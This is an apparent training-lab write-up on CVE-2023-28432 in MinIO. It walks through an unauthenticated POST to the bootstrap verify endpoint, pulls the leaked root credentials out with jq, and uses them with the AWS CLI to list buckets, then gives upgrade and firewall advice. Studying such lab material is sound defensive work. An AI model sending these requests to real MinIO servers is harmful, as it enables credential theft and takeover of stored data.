# MinIO Cluster Information Disclosure & S3 Admin Key Leakage (CVE-2023-28432)

## Overview

CVE-2023-28432 is a critical security vulnerability affecting MinIO object storage in distributed cluster configurations prior to `RELEASE.2023-03-20T20-16-18Z`. MinIO is a high-performance Amazon S3-compatible object store widely deployed in modern Kubernetes and cloud native environments.

In vulnerable cluster deployments, MinIO exposed an unauthenticated HTTP POST endpoint at `/minio/bootstrap/v1/verify`. This endpoint was intended for inter-node communication to verify that all cluster nodes share consistent configuration states. However, because the endpoint lacked authentication, an external attacker can submit an empty POST request and receive a complete JSON dump of the server's environment variables. This leaked payload contains the cluster's root administrative credentials (`MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD`), along with proxy secrets and LDAP bindings, allowing immediate administrative takeover of all stored S3 buckets and objects.

- **S3 API Port**: `http://localhost:9000`
- **Web Console**: `http://localhost:9002`
- **Docker Shortcut**: `./lab start minio-leak`
- **Container Name**: `cyberlab_realworld_minio_leak`
- **RAM Footprint**: ~100 MB (Go runtime)

---

## Exploitation Walkthrough

### 1. Querying the Bootstrap Verify Endpoint

Send an unauthenticated POST request to `/minio/bootstrap/v1/verify`:

```bash
curl -i -s -X POST http://localhost:9000/minio/bootstrap/v1/verify
```

### 2. Extracting Leaked Credentials

The response contains a JSON object listing system environment variables:

```bash
curl -s -X POST http://localhost:9000/minio/bootstrap/v1/verify | jq '{MinioEnv: .MinioEnv}'
```

Leaked values include:

```json
{
  "MINIO_ROOT_USER": "admin",
  "MINIO_ROOT_PASSWORD": "SuperSecretAdminPassword123!"
}
```

### 3. S3 Bucket Exfiltration using AWS CLI

Configure the AWS CLI with the stolen MinIO root credentials:

```bash
export AWS_ACCESS_KEY_ID="admin"
export AWS_SECRET_ACCESS_KEY="SuperSecretAdminPassword123!"
export AWS_ENDPOINT_URL="http://localhost:9000"

# List all S3 buckets
aws --endpoint-url http://localhost:9000 s3 ls
```

---

## Defensive Remediation & Hardening

1. **Upgrade MinIO**:
   Upgrade MinIO to version `RELEASE.2023-03-20T20-16-18Z` or newer, which enforces mutual TLS authentication and JWT session validation on cluster bootstrap verification routes.
2. **Firewall Storage Endpoints**:
   Never expose MinIO cluster communication ports directly to public networks.

---

## Video Walkthroughs & Technical References

- [Go Hack Yourself: API Hacking for Beginners](https://www.youtube.com/watch?v=IO4FjTflU6s)
- [MinIO GitHub Security Advisory GHSA-6v2q-w9qf-x67x](https://github.com/minio/minio/security/advisories/GHSA-6v2q-w9qf-x67x)
- [Vulhub MinIO Information Disclosure Advisory](https://vulhub.org/#/environments/minio/CVE-2023-28432/)
